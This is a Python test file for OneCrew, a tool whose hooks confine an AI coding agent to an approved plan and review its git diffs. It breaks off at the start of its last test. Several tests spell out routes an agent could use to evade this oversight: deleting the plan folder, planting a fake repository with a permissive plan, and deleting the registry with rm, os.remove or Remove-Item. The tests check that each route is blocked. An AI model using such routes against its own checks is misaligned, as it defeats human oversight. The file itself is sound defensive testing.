"""OneCrew 2.2.0.dev3 (v22-trust-fixes): a test for each defect that the independent reviews found at 8383446 (and in the first fix, 38e1703).

P0.1 the portable hook finds its plan without the project copy or even without `.onecrew/`, judges an edit by the repository of the path it writes, and
stops at the repository boundary    P0.2 the reviewer sees what Git tracks (staged files included, submodules never ignored) and a path it cannot read is
not a pass    P0.3 the diff is cut from one recorded tree, so a change made during the review is not a pass    P0.4 nothing is neutral unless the contract says
so    P0.5 `plan report` reads the same milestone views as `plan show`, and an accepted plan is read from its acceptance record    P0.6 a carried verdict
needs the same covers and the same text of every covered output, and the independence rule for the new revision    P0.7 the hooks print UTF-8 and `init` keeps
other tools' handlers    D3 a tree id read from a receipt is hex before git sees it, and a plan without a usable base gives an inconclusive receipt.
Every defect has a test that fails on the code that had it. A few tests are guards for behaviour that must not change (an ignored file is no obstacle, an
explicit project is searched in itself only, an accepted plan's report does not move after a later commit) and are green on the old code too.
No test calls a model: reviewer.call is replaced.
"""
import argparse
import contextlib
import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest.mock import patch

from onecrew.ledger import LedgerError
from onecrew.snapshots import Snapshots
from onecrew.v2 import contract as contracts, hook_cli, install, plan as plans, report, verdict, where
from onecrew.v2.verifiers import command, reviewer
from tests.test_v2_l1 import Fixture, milestone, plan_json

ROOT = Path(__file__).resolve().parent.parent
VI_MILESTONE = 'Kiểm tra tệp mẫu tồn tại'
VI_OWNED = 'tệp-mẫu'


# ---- P0.1: the hook finds its plan, up to the repository root and no further -------------------------------------------------------------

class HookBase(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory(); self.addCleanup(self.temp.cleanup)
        self.base = Path(self.temp.name).resolve()
        self.repo = self.base / 'project'; (self.repo / '.git').mkdir(parents=True)       # a directory called .git is all `git_root` looks for
        self.state = self.base / 'state'
        env = patch.dict(os.environ); env.start(); self.addCleanup(env.stop)
        for name in ('ONECREW_ACTOR', 'CLAUDECODE', 'CLAUDE_CODE_CHILD_SESSION', 'ONECREW_LANG', 'CLAUDE_PROJECT_DIR'): os.environ.pop(name, None)
        nowhere = str(self.base / 'nowhere')
        os.environ.update(LOCALAPPDATA=nowhere, HOME=nowhere, USERPROFILE=nowhere)       # the default state root is not the real one

    def document(self, project, mode='enforce', owned=('a.txt',), status='approved', name='p', scratch=()):
        return {'plan': name, 'revision': 1, 'plan_sha': 'x', 'status': status, 'mode': mode, 'owned': list(owned), 'non_goals': [], 'bash_deny': [], 'protected': [],
                'scratch': list(scratch), 'title': 'Hợp đồng thử tiếng Việt', 'output': ['Tệp mẫu tồn tại'], 'budget': {'max_calls': 5, 'time': 30},
                'milestones': [{'id': 'M1', 'title': VI_MILESTONE, 'state': 'pending', 'verifier': {'type': 'command'}}],
                'project': str(project), 'state_root': str(self.state), 'exported_at': '2026-10-21T00:00:00+00:00'}

    def put(self, path, value):
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(json.dumps(value), encoding='utf-8')

    def project_copy(self, project, **kw):
        self.put(Path(project) / '.onecrew' / hook_cli.FILE, self.document(project, **kw))

    def state_copy(self, project, name='p', **kw):
        self.put(self.state / 'plans' / name / hook_cli.FILE, self.document(project, **kw))

    def config(self, project):
        self.put(where.config_file(project), {'state_root': str(self.state)})

    def governing(self, project, cwd=None):
        args = argparse.Namespace(project=None, state_root=None)
        with patch.dict(os.environ, {'CLAUDE_PROJECT_DIR': str(project)}):
            return hook_cli.governing(args, {'cwd': str(cwd or project)})

    def check(self, tool, target=None, project=None, cwd=None, command=None):
        tool_input = {'command': command} if command is not None else {'file_path': str(target)}
        event = json.dumps({'tool_name': tool, 'tool_input': tool_input, 'cwd': str(cwd or project or self.repo), 'session_id': 's'})
        stdin = type('In', (), {'buffer': io.BytesIO(event.encode('utf-8'))})()
        err = io.StringIO()
        with patch.dict(os.environ, {'CLAUDE_PROJECT_DIR': str(project or self.repo)}), patch.object(sys, 'stdin', stdin), contextlib.redirect_stderr(err):
            code = hook_cli.check(argparse.Namespace(project=None, state_root=None))
        return code, err.getvalue()


class HookFindsItsPlan(HookBase):
    def test_a_missing_project_copy_does_not_end_enforcement(self):
        self.config(self.repo); self.state_copy(self.repo)
        self.assertFalse((self.repo / '.onecrew' / hook_cli.FILE).exists())
        plan, root, error, source = self.governing(self.repo)
        self.assertEqual((plan['mode'], error, source), ('enforce', None, 'restored'))
        self.assertEqual(Path(root).resolve(), self.repo)
        (self.repo / '.onecrew' / hook_cli.FILE).unlink()
        for tool, name in (('Edit', 'outside.txt'), ('Write', 'also-outside.txt')):
            code, text = self.check(tool, self.repo / name)
            self.assertEqual(code, 2, tool); self.assertIn('not in the owned scope', text)
            (self.repo / '.onecrew' / hook_cli.FILE).unlink(missing_ok=True)
        self.assertEqual(self.check('Edit', self.repo / 'a.txt')[0], 0)

    def test_a_plan_is_found_from_a_directory_of_the_repository_but_not_from_one_above_it(self):
        self.project_copy(self.repo)
        deep = self.repo / 'src' / 'deep'; deep.mkdir(parents=True)
        self.assertEqual(self.governing(deep)[0]['plan'], 'p')
        self.assertEqual(where.repository_dirs(deep), [deep.resolve(), deep.resolve().parent, self.repo])
        self.assertEqual(where.repository_dirs(self.base / 'elsewhere'), [self.base / 'elsewhere'])         # no repository: no parent is searched

    def test_the_plan_of_a_parent_repository_does_not_govern_a_repository_inside_it(self):
        self.project_copy(self.repo)
        inner = self.repo / 'vendor' / 'lib'; (inner / '.git').mkdir(parents=True)
        self.assertEqual(self.governing(self.repo)[0]['plan'], 'p')
        self.assertIsNone(self.governing(inner)[0])
        self.assertEqual(self.check('Edit', inner / 'anything.txt', project=inner)[0], 0)

    def test_an_event_without_a_tool_is_governed_by_the_project_alone(self):
        other = self.base / 'other'; (other / '.git').mkdir(parents=True)
        self.project_copy(other)
        self.assertEqual(self.governing(other)[0]['plan'], 'p')
        self.assertIsNone(self.governing(self.repo, cwd=other)[0])             # stop, session and prompt: the project is CLAUDE_PROJECT_DIR; the cwd is not another project to ask
        self.config(self.repo); self.state_copy(other)
        self.assertIsNone(self.governing(self.repo)[0])                        # a state-root copy names its own project, not this one

    def test_an_explicit_project_is_still_searched_in_itself_only(self):
        self.project_copy(self.repo)
        sub = self.repo / 'sub'; sub.mkdir()
        args = argparse.Namespace(project=sub, state_root=None)
        self.assertEqual(hook_cli.locate(args, {}), (None, sub, None))

    def test_deleting_the_whole_onecrew_folder_does_not_hide_a_custom_state_root(self):
        self.config(self.repo); self.project_copy(self.repo); self.state_copy(self.repo)
        where.register_project(self.repo, self.state)                        # what `onecrew init` does, in a place outside the project
        shutil.rmtree(self.repo / '.onecrew')                                # config.json goes with the folder
        self.assertIsNone(where.configured_state_root(self.repo))
        code, text = self.check('Edit', self.repo / 'outside.txt')
        self.assertEqual(code, 2, text); self.assertIn('not in the owned scope', text)
        self.assertEqual(self.check('Edit', self.repo / 'a.txt')[0], 0)

    def test_init_records_the_state_root_outside_the_project_and_the_registry_forgets_what_is_gone(self):
        exe = self.base / 'venv' / 'onecrew'; exe.parent.mkdir(); exe.write_text('x')
        with contextlib.redirect_stdout(io.StringIO()):
            code = install.init(project=self.repo, state_root=self.state, yes=True, exe=exe, claude=lambda: ('ok', 'claude', ''))
        self.assertEqual(code, 0)
        self.assertEqual(where.registered_state_root(self.repo).resolve(), self.state.resolve())
        self.assertFalse(str(where.registry_file()).startswith(str(self.repo)))
        gone, other = self.base / 'gone', self.base / 'other'; gone.mkdir(); other.mkdir(); where.register_project(gone, self.state); gone.rmdir()
        where.register_project(other, self.state)                                            # a write drops the entries of directories that are gone from a mounted drive
        self.assertEqual(sorted(json.loads(where.registry_file().read_text(encoding='utf-8'))['projects']), sorted(os.path.normcase(str(p.resolve())) for p in (self.repo, other)))


class HookJudgesTheRepositoryOfThePath(HookBase):
    """A session opened in a parent checkout (CLAUDE_PROJECT_DIR) that edits a file of a nested worktree with its own plan: that plan governs the edit."""

    def setUp(self):
        super().setUp()
        self.child = self.repo / 'wt' / 'child'; (self.child / '.git').mkdir(parents=True)
        self.project_copy(self.child)

    def test_an_edit_in_the_worktree_is_judged_by_the_plan_of_the_worktree(self):
        for cwd in (self.repo, self.child):                      # the session never moved, or it moved into the worktree
            with self.subTest(cwd=cwd.name):
                code, text = self.check('Edit', self.child / 'outside.txt', project=self.repo, cwd=cwd)
                self.assertEqual(code, 2, text); self.assertIn('not in the owned scope', text)
                self.assertEqual(self.check('Edit', self.child / 'a.txt', project=self.repo, cwd=cwd)[0], 0)
        self.assertEqual(self.check('Write', self.child / 'new' / 'deep' / 'file.txt', project=self.repo)[0], 2)      # the folders of a new file do not exist yet
        self.assertEqual(self.check('Edit', self.repo / 'other.txt', project=self.repo)[0], 0)                        # the parent has no plan of its own

    def test_a_shell_command_is_judged_by_the_plan_of_its_cwd(self):
        code, text = self.check('Bash', project=self.repo, cwd=self.child, command='echo x > outside.txt')
        self.assertEqual(code, 2, text)
        self.assertEqual(self.check('Bash', project=self.repo, cwd=self.repo, command='echo x > other.txt')[0], 0)

    def test_the_registry_is_written_whenever_the_hook_reads_a_config_json_and_cannot_be_edited_by_the_ai(self):
        self.config(self.repo); self.project_copy(self.repo); self.state_copy(self.repo)
        self.assertIsNone(where.registered_state_root(self.repo))
        self.assertEqual(self.check('Edit', self.repo / 'a.txt', project=self.repo)[0], 0)           # no init was ever run here: the hook records the pointer itself
        self.assertEqual(where.registered_state_root(self.repo).resolve(), self.state.resolve())
        shutil.rmtree(self.repo / '.onecrew')
        self.assertEqual(self.check('Edit', self.repo / 'outside.txt', project=self.repo)[0], 2)      # and it carries the plan across the deletion of .onecrew/
        registry = where.registry_file()
        self.assertTrue(registry.is_file())
        for tool, command in (('Write', None), ('Bash', f'rm "{registry}"'), ('Bash', f'python -c "import os; os.remove(r\'{registry}\')"'), ('PowerShell', f'Remove-Item "{registry}"')):
            code, text = self.check(tool, registry, project=self.repo, command=command)
            self.assertEqual(code, 2, (tool, text))
        self.assertIn('hook-projects.json', ''.join(hook_cli.deny_rules(self.state)))

    def test_two_writers_do_not_lose_each_others_entries_and_an_unmounted_drive_is_not_forgotten(self):
        import threading
        projects = []
        for n in range(6):
            project = self.base / f'proj{n}'; project.mkdir(); projects.append(project)
        threads = [threading.Thread(target=where.register_project, args=(project, self.state)) for project in projects]
        for thread in threads: thread.start()
        for thread in threads: thread.join()
        self.assertEqual(sorted(json.loads(where.registry_file().read_text(encoding='utf-8'))['projects']), sorted(os.path.normcase(str(p.resolve())) for p in projects))
        self.assertFalse(where.registry_file().with_name(where.REGISTRY + '.lock').exists())
        if os.name == 'nt' and not Path('Q:\\').exists():                                              # a project on a drive that is not mounted now stays
            data = json.loads(where.registry_file().read_text(encoding='utf-8')); data['projects']['q:\\unplugged\\project'] = str(self.state)
            where.registry_file().write_text(json.dumps(data), encoding='utf-8')
            gone = self.base / 'gone'; gone.mkdir(); where.register_project(gone, self.state); gone.rmdir()
            where.register_project(projects[0], self.base / 'elsewhere')
            kept = json.loads(where.registry_file().read_text(encoding='utf-8'))['projects']
            self.assertIn('q:\\unplugged\\project', kept); self.assertNotIn(os.path.normcase(str(gone.resolve())), kept)

    def test_the_process_cwd_is_a_place_only_when_nothing_else_names_one(self):
        os.environ.pop('CLAUDE_PROJECT_DIR', None)
        args = argparse.Namespace(project=None, state_root=None)
        self.assertEqual(hook_cli.candidate_dirs(args, {'tool_name': 'Bash', 'tool_input': {'command': 'ls'}}), [(Path(os.getcwd()), 'session')])
        self.assertEqual(hook_cli.candidate_dirs(args, {'tool_name': 'Edit', 'tool_input': {'file_path': str(self.child / 'a.txt')}, 'cwd': str(self.child)}),
                         [(self.child, 'session'), (self.child.resolve(), 'limited')])      # the cwd is the session here, and an Edit has no other cwd place


class HookEveryPlanJudges(HookBase):
    """A call is judged by EVERY plan that applies (the session's project, the repository of what it writes, the repository of its cwd) and blocked when any
    enforce plan blocks it: a plan that is accepted, in log mode or absent never excuses another, and a nested repository cannot take the session's place."""

    def plan_repo(self, path, gitfile=False, **kw):
        path.mkdir(parents=True, exist_ok=True)
        if gitfile: (path / '.git').write_text('gitdir: nowhere\n')
        else: (path / '.git').mkdir(exist_ok=True)
        self.project_copy(path, **kw)
        return path

    def echo_to(self, path):
        return f'echo x > {path.as_posix()}'

    def test_a_plan_of_another_repository_never_lets_through_what_the_sessions_plan_blocks(self):
        w, q = self.plan_repo(self.base / 'w'), self.plan_repo(self.base / 'q')
        for label, kw in (('accepted, owns everything', dict(status='accepted', owned=('**',))), ('approved, owns everything', dict(owned=('**',))), ('log mode', dict(mode='log'))):
            with self.subTest(label):
                self.project_copy(q, **kw)
                code, text = self.check('Edit', q / 'x.txt', project=w, cwd=w)
                self.assertEqual(code, 2, text)
        self.assertEqual(self.check('Edit', w / 'a.txt', project=w, cwd=w)[0], 0)

    def test_the_plan_of_a_parent_repository_applies_when_a_session_in_a_child_edits_it(self):
        parent = self.plan_repo(self.base / 'parent', owned=('src/**',)); child = self.plan_repo(parent / 'wt', gitfile=True)
        self.assertEqual(self.check('Edit', parent / 'src' / 'x.py', project=child, cwd=child)[0], 2)          # the child's plan owns only a.txt
        self.assertEqual(self.check('Edit', child / 'a.txt', project=child, cwd=child)[0], 0)

    def test_a_shell_command_is_judged_by_the_plan_of_the_repository_it_writes_in(self):
        parent = self.base / 'p4'; (parent / '.git').mkdir(parents=True)                                       # the session's project holds no plan
        wt = self.plan_repo(parent / 'wt', gitfile=True)
        self.assertEqual(self.check('Bash', project=parent, cwd=parent, command=self.echo_to(wt / 'secret.txt'))[0], 2)
        self.assertEqual(self.check('Edit', wt / 'secret.txt', project=parent, cwd=parent)[0], 2)
        self.config(wt); self.state_copy(wt); (wt / '.onecrew' / hook_cli.FILE).unlink()                       # the project copy of the worktree is gone: its state-root copy still blocks
        self.assertEqual(self.check('Bash', project=parent, cwd=parent, command=self.echo_to(wt / 'secret.txt'))[0], 2)
        self.assertEqual(self.check('Edit', wt / 'secret.txt', project=parent, cwd=parent)[0], 2)
        self.assertEqual(self.check('Bash', project=parent, cwd=parent, command=self.echo_to(parent / 'other.txt'))[0], 0)       # a path of the plan-less parent is nobody's

    def test_a_plan_in_the_cwd_cannot_excuse_what_the_sessions_plan_blocks(self):
        session = self.plan_repo(self.base / 'p5'); wt = self.plan_repo(session / 'wt', gitfile=True, status='accepted', owned=('**',))
        self.assertEqual(self.check('Bash', project=session, cwd=wt, command=self.echo_to(session / 'secret.txt'))[0], 2)
        self.assertEqual(self.check('Bash', project=session, cwd=session, command=self.echo_to(session / 'secret.txt'))[0], 2)

    def test_a_fake_repository_made_inside_the_owned_scope_cannot_replace_the_sessions_plan(self):
        session = self.plan_repo(self.base / 'p6', owned=('src/**',))
        fake = self.plan_repo(session / 'src' / 'fake', gitfile=True, status='accepted', owned=('**',))         # what an AI that may write src/** can make: a .git and a plan of its own
        self.assertEqual(self.check('Bash', project=session, cwd=fake, command=self.echo_to(session / 'secret.txt'))[0], 2)
        self.assertEqual(self.check('Edit', session / 'secret.txt', project=session, cwd=fake)[0], 2)
        self.assertEqual(self.check('Edit', fake / 'x.txt', project=session, cwd=fake)[0], 0)                   # inside src/**: the session's plan allows it

    def test_a_log_mode_plan_alone_blocks_nothing(self):
        solo = self.plan_repo(self.base / 'solo', mode='log')
        self.assertEqual(self.check('Edit', solo / 'outside.txt', project=solo)[0], 0)

    def test_a_plan_reached_through_the_cwd_judges_only_what_the_call_does_in_its_own_repository(self):
        w = self.plan_repo(self.base / 'w'); q = self.plan_repo(self.base / 'q', owned=('src/**',))          # the session's cwd drifted into the sibling repository Q
        self.assertEqual(self.check('Edit', w / 'a.txt', project=w, cwd=q)[0], 0)                            # an Edit has no cwd place
        self.assertEqual(self.check('Bash', project=w, cwd=q, command=self.echo_to(w / 'a.txt'))[0], 0)
        self.assertEqual(self.check('Bash', project=w, cwd=q, command='git status')[0], 0)
        self.assertEqual(self.check('Bash', project=w, cwd=q, command=self.echo_to(q / 'other.txt'))[0], 2)  # a write INTO Q outside its owned scope is Q's business
        self.assertEqual(self.check('Bash', project=w, cwd=q, command=self.echo_to(q / 'src' / 'x.py') + ' && echo y > ' + (w / 'a.txt').as_posix())[0], 2)    # and W's plan blocks the Q path

    def test_the_plan_of_a_parent_checkout_does_not_block_a_worker_session_in_its_worktree(self):
        parent = self.plan_repo(self.base / 'parent', owned=('src/**',))
        wt = self.plan_repo(parent / '.claude' / 'worktrees' / 'wt', gitfile=True)
        self.assertEqual(self.check('Edit', wt / 'a.txt', project=wt, cwd=parent)[0], 0)
        self.assertEqual(self.check('Bash', project=wt, cwd=parent, command=self.echo_to(wt / 'a.txt'))[0], 0)      # the worktree is another repository than the parent
        self.assertEqual(self.check('Bash', project=wt, cwd=wt, command=self.echo_to(wt / 'a.txt'))[0], 0)
        self.assertEqual(self.check('Bash', project=wt, cwd=parent, command=self.echo_to(parent / 'src' / 'x.py'))[0], 2)   # the parent's own file is outside the session's owned scope

    def test_a_stopped_plan_in_the_cwd_repository_does_not_lock_the_session(self):
        w = self.plan_repo(self.base / 'w'); q = self.plan_repo(self.base / 'q', status='stopped_with_report', owned=('src/**',))
        self.assertEqual(self.check('Bash', project=w, cwd=q, command=f'cd {w.as_posix()}')[0], 0)
        self.assertEqual(self.check('Bash', project=w, cwd=q, command='git status')[0], 0)
        self.assertEqual(self.check('Edit', w / 'a.txt', project=w, cwd=q)[0], 0)
        self.assertEqual(self.check('Bash', project=w, cwd=q, command=self.echo_to(q / 'src' / 'x.py'))[0], 2)      # a write into the stopped repository is refused
        self.assertEqual(self.check('Bash', project=q, cwd=q, command='git status')[0], 2)                           # and its own session is locked, as before

    def test_a_scratch_folder_or_a_nested_worktree_inside_another_repository_stays_under_that_repositorys_plan(self):
        """A deliberate consequence: the plan of the repository that holds a path judges writes to it, whatever the session's plan allows."""
        w, q = self.plan_repo(self.base / 'w2'), self.plan_repo(self.base / 'q2', owned=('src/**',))
        (q / 'tmp').mkdir()
        self.project_copy(w, scratch=[str(q / 'tmp')])
        self.assertEqual(self.check('Edit', q / 'tmp' / 'x.txt', project=w)[0], 2)                                   # Q's plan owns only src/**
        session = self.plan_repo(self.base / 'w3', owned=('**',)); nested = self.plan_repo(session / 'wt' / 'n', gitfile=True)
        self.assertEqual(self.check('Edit', nested / 'b.txt', project=session)[0], 2)

    def test_the_mention_rule_looks_at_each_part_of_a_command(self):
        registry = where.registry_file()
        (self.base / 'p').mkdir(); where.register_project(self.base / 'p', self.state)                              # the registry file exists now
        session = self.plan_repo(self.base / 'm')
        for command in (f'ls; python -c "import os; os.remove(r\'{registry}\')"', f'ls && rm "{registry}"', f'echo hi\npython -c "print(open(r\'{registry}\'))"',
                        f'python -c "import os; cat = os.remove; cat(r\'{registry}\')"'):
            with self.subTest(command=command[:40]):
                self.assertEqual(self.check('Bash', project=session, command=command)[0], 2)
        self.assertEqual(self.check('Bash', project=session, command=f'cat "{registry}" | head -3')[0], 0)           # reading it is not touching it
        self.assertEqual(hook_cli.shell_segments('a; b && c || d | e & f\ng'), ['a', ' b ', ' c ', ' d ', ' e ', ' f', 'g'])
        self.assertEqual(hook_cli.shell_segments('python -c "a; b" ; ls'), ['python -c "a; b" ', ' ls'])


# ---- P0.7: UTF-8 on stdout and stderr, and the handlers of other tools --------------------------------------------------------------------

class HookPrintsUtf8(HookBase):
    def run_hook(self, form, verb, event):
        env = {k: v for k, v in os.environ.items() if k.upper() not in ('PYTHONUTF8', 'PYTHONIOENCODING', 'PYTHONPATH')}
        env.update(PYTHONIOENCODING='cp1252', CLAUDE_PROJECT_DIR=str(self.repo), PYTHONPATH=str(ROOT))         # a pipe that cannot hold Vietnamese, as Windows hands one
        if form == 'module': argv = [sys.executable, '-c', 'import sys; from onecrew.v2.hook_cli import main; sys.exit(main(sys.argv[1:]))', 'hook', verb]
        else: argv = [sys.executable, '-m', 'onecrew.v2.cli', 'hook', verb]                                  # the router the installed `onecrew` executable runs
        done = subprocess.run(argv, input=json.dumps(event).encode('utf-8'), capture_output=True, env=env, cwd=str(self.repo), timeout=120)
        return done.returncode, done.stdout.decode('utf-8', 'replace'), done.stderr.decode('utf-8', 'replace')

    def test_stop_session_and_check_print_vietnamese_through_a_cp1252_pipe(self):
        self.config(self.repo); self.project_copy(self.repo, owned=(VI_OWNED,)); self.state_copy(self.repo, owned=(VI_OWNED,))
        for form in ('module', 'router'):
            with self.subTest(form=form):
                code, out, err = self.run_hook(form, 'stop', {'hook_event_name': 'Stop', 'session_id': 'u-' + form, 'cwd': str(self.repo), 'stop_hook_active': False})
                self.assertEqual(code, 0, err); self.assertNotIn('Traceback', err)
                self.assertIn(VI_MILESTONE, json.loads(out)['reason'])
                code, out, err = self.run_hook(form, 'session', {'hook_event_name': 'SessionStart', 'source': 'startup', 'session_id': 'u', 'cwd': str(self.repo)})
                self.assertEqual(code, 0, err); self.assertNotIn('Traceback', err)
                self.assertIn('Hợp đồng thử tiếng Việt', json.loads(out)['hookSpecificOutput']['additionalContext'])
                code, out, err = self.run_hook(form, 'check', {'hook_event_name': 'PreToolUse', 'tool_name': 'Edit', 'cwd': str(self.repo), 'session_id': 'u',
                                                               'tool_input': {'file_path': str(self.repo / 'ngoài-phạm-vi.txt')}})
                self.assertEqual(code, 2, err); self.assertIn(VI_OWNED, err); self.assertNotIn('\\u', err)         # the reason is text, not escapes


class InitKeepsWhatIsNotItsOwn(unittest.TestCase):
    MENTIONS = [{'type': 'command', 'command': 'echo onecrew.v2.hook_cli is monitored'},
                {'type': 'command', 'command': 'python', 'args': ['-c', 'print("onecrew.v2.hook_cli")']},
                {'type': 'command', 'command': '/opt/tool/audit', 'args': ['--log', 'onecrew.v2.hook_cli', 'hook', 'check']}]

    def test_a_handler_that_only_mentions_the_module_is_not_ours_and_survives_a_merge(self):
        for handler in self.MENTIONS:
            self.assertFalse(install.is_ours(handler), handler)
        ours = hook_cli.portable_settings(Path('/x/onecrew'), Path('/s'))
        existing = {'hooks': {'PreToolUse': [{'matcher': 'Bash', 'hooks': [dict(h) for h in self.MENTIONS]}]}}
        merged = install.merge_settings(existing, ours)
        kept = [h for entry in merged['hooks']['PreToolUse'] for h in entry['hooks']]
        for handler in self.MENTIONS: self.assertIn(handler, kept)
        self.assertEqual(sum(1 for h in kept if install.is_ours(h)), 1)
        self.assertEqual(install.merge_settings(merged, ours), merged)                 # a second merge replaces its own entry and changes nothing else

    def test_every_form_onecrew_itself_wrote_is_still_ours(self):
        shell = ('python -X utf8 -c "import sys; sys.path.insert(0, \'/r\'); from onecrew.v2.hook_cli import main; sys.exit(main(sys.argv[1:]))" '
                 '--project /p --state-root /s hook check')
        written = [h for event in (hook_cli.settings(Path('/p'), Path('/s'), ROOT), hook_cli.portable_settings(Path('/x/onecrew.exe'), Path('/s')))
                   for entries in event['hooks'].values() for entry in entries for h in entry['hooks']]
        for handler in written + [{'type': 'command', 'command': shell}]:
            self.assertTrue(install.is_ours(handler), handler)
        old = {'hooks': {'Stop': [{'hooks': [{'type': 'command', 'command': shell}, self.MENTIONS[0]]}]}}
        merged = install.merge_settings(old, hook_cli.portable_settings(Path('/x/onecrew'), Path('/s')))
        self.assertEqual([h['command'] for e in merged['hooks']['Stop'] for h in e['hooks'] if not install.is_ours(h)], [self.MENTIONS[0]['command']])
        self.assertEqual(sum(1 for e in merged['hooks']['Stop'] for h in e['hooks'] if install.is_ours(h)), 1)


# ---- the reviewer: P0.2, P0.3 and D3 ------------------------------------------------------------------------------------------------------------

def review_milestone(mid='M1', **config):
    return {'id': mid, 'title': 'Review ' + mid, 'covers': ['O1'], 'verifier': {'type': 'reviewer', 'config': dict(
        {'provider': 'claude', 'model': 'claude-haiku-5-5', 'max_minutes': 5,
         'criteria': [{'id': 'R1', 'question': 'Does the diff keep a.txt readable? fail if a.txt was deleted.'}]}, **config)}}


def passing(outside=()):
    return json.dumps({'criteria': [{'id': 'R1', 'verdict': 'pass', 'evidence': [{'file': 'a.txt', 'line': 1, 'note': 'seen'}]}], 'outside_criteria': list(outside)})


class ReviewerBase(Fixture):
    def setUp(self):
        super().setUp()
        self.prompts = []

        def fake(prompt, config, env, scratch, limit):
            self.prompts.append(prompt)
            return self.reply, {}, None, False, b'raw'
        self.reply = passing()
        patcher = patch.object(reviewer, 'call', fake); patcher.start(); self.addCleanup(patcher.stop)

    def start(self, milestones=None, author='codex', **extra):
        plans.propose(self.ledger, 'P1', plan_json(milestones=milestones or [review_milestone()], **extra), author)
        plans.approve(self.ledger, 'P1', 'owner', 'said yes in chat')

    def commit(self, name, text, message='work'):
        (self.root / name).parent.mkdir(parents=True, exist_ok=True)
        (self.root / name).write_text(text); self.git('add', '.'); self.git('commit', '-q', '-m', message)

    def last(self):
        recorded = [p for k, p in self.events() if k == 'verdict.recorded'][-1]
        return json.loads(Snapshots(self.ledger.state_root).read_blob(recorded['receipt']))

    def blob(self, key):
        return Snapshots(self.ledger.state_root).read_blob(key).decode('utf-8')

    def view(self, mid='M1'):
        return next(m for m in plans.show(self.ledger, 'P1')['milestones'] if m['id'] == mid)


class ReviewerSeesWhatGitTracks(ReviewerBase):
    def test_a_new_file_that_was_git_added_is_in_the_diff_and_in_the_prompt(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n')
        (self.root / 'new.py').write_text('NEW_FILE_MARK = 1\n'); self.git('add', 'new.py')
        self.assertIn('NEW_FILE_MARK', verdict.diff(self.ledger, 'P1', 'M1'))
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertEqual((self.last()['result'], self.last()['not_shown']), ('pass', []))
        self.assertIn('NEW_FILE_MARK', self.prompts[0])
        self.assertIn('new.py', self.git('ls-tree', '-r', '--name-only', self.last()['tracked_tree']))
        self.assertEqual(plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())['status'], 'accepted')

    def test_an_untracked_file_that_is_not_ignored_is_named_and_the_verdict_is_not_a_pass(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n')
        (self.root / 'scratch.py').write_text('SCRATCH_MARK = 1\n')
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual((receipt['result'], receipt['calls'], receipt['not_shown'], self.prompts), ('inconclusive', 0, ['scratch.py'], []))
        self.assertIn('scratch.py', receipt['error']); self.assertIn('.gitignore', receipt['error'])
        self.assertNotEqual(self.view()['state'], 'passed')
        with self.assertRaises(LedgerError): plans.accept(self.ledger, 'P1', 'owner', 'ref', self.tree())
        self.git('add', 'scratch.py')                                            # once Git tracks it the reviewer sees it
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertEqual(self.last()['result'], 'pass'); self.assertIn('SCRATCH_MARK', self.prompts[0])

    def test_an_ignored_file_is_not_an_obstacle(self):
        self.start(); self.commit('.gitignore', 'out.log\n'); self.commit('a.txt', 'one\ntwo\n')
        (self.root / 'out.log').write_text('noise\n')
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        self.assertEqual((self.last()['result'], len(self.prompts)), ('pass', 1))
        self.assertNotIn('noise', self.prompts[0])

    def test_a_pass_without_a_call_still_needs_a_tree_with_nothing_hidden(self):
        (self.root / 'junk.txt').write_text('lying around since before the approval\n')
        self.start()                                                              # the approved tree holds the junk, so nothing changed since: the empty-diff pass would apply
        verdict.run(self.ledger, 'P1', 'M1', self.root)
        receipt = self.last()
        self.assertEqual((receipt['result'], receipt['calls'], receipt['not_shown']), ('inconclusive', 0, ['junk.txt']))
        self.assertEqual(reviewer.expected_result(dict(receipt, error=None)), 'inconclusive')

    def test_a_path_the_diff_does_not_name_is_reported_by_its_whole_header(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n'); self.commit('data/a.txt', 'nested\n')
        tracked = command.tracked_tree(self.root)
        base = [p for k, p in self.events() if k == 'plan.approved'][0]['base_tracked']
        diff = verdict.diff(self.ledger, 'P1', 'M1')
        self.assertEqual(reviewer.not_shown(self.root, base, tracked, diff), [])
        cut = '\n'.join(l for l in diff.split('\n') if l != 'diff --git a/a.txt b/a.txt')        # the header of a.txt is gone; that of data/a.txt (which holds "a.txt") is not
        self.assertEqual(reviewer.not_shown(self.root, base, tracked, cut), ['a.txt'])

    def test_headers_with_special_characters_are_compared_the_way_git_writes_them(self):
        names = ['plain.txt', 'with space.txt', 'tab\there.txt', 'quote"d.txt', 'back\\slash.txt', 'bell\a.txt', 'café.txt', 'ctl\x01.txt']
        header = lambda p: f'diff --git {reviewer._git_name("a/", p)} {reviewer._git_name("b/", p)}'
        self.assertEqual(header('plain.txt'), 'diff --git a/plain.txt b/plain.txt')
        self.assertEqual(header('with space.txt'), 'diff --git a/with space.txt b/with space.txt')
        self.assertEqual(header('tab\there.txt'), 'diff --git "a/tab\\there.txt" "b/tab\\there.txt"')
        self.assertEqual(header('quote"d.txt'), 'diff --git "a/quote\\"d.txt" "b/quote\\"d.txt"')
        self.assertEqual(header('back\\slash.txt'), 'diff --git "a/back\\\\slash.txt" "b/back\\\\slash.txt"')
        self.assertEqual(header('ctl\x01.txt'), 'diff --git "a/ctl\\001.txt" "b/ctl\\001.txt"')
        self.assertEqual(header('café.txt'), 'diff --git a/café.txt b/café.txt')            # core.quotepath=off: non-ASCII is written as it is
        with patch.object(command, 'changed_paths', return_value=names):
            self.assertEqual(reviewer.not_shown(self.root, 'a' * 40, 'b' * 40, '\n'.join(header(p) for p in names)), [])
            self.assertEqual(reviewer.not_shown(self.root, 'a' * 40, 'b' * 40, '\n'.join(header(p) for p in names[:-1])), [names[-1]])


    def test_a_real_binary_file_is_named_by_the_diff_and_does_not_stop_a_pass(self):
        self.start(); self.commit('a.txt', 'one\ntwo\n')
